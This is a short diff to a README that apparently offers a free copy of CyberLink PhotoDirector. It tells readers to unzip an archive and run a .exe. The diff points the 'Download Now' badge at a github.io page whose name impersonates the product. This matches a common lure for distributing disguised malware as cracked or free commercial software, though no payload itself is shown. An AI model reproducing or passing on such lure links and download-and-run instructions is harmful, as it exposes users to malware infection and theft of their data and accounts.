@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://photodirector-cyberlink-free.github.io/.github/)
 
 ## 📸 Overview
 <img width="677" height="336" alt="photodirector-main-interface" src="https://github.com/user-attachments/assets/d6f87509-907c-44b7-a55b-7998b82f1e0e" />
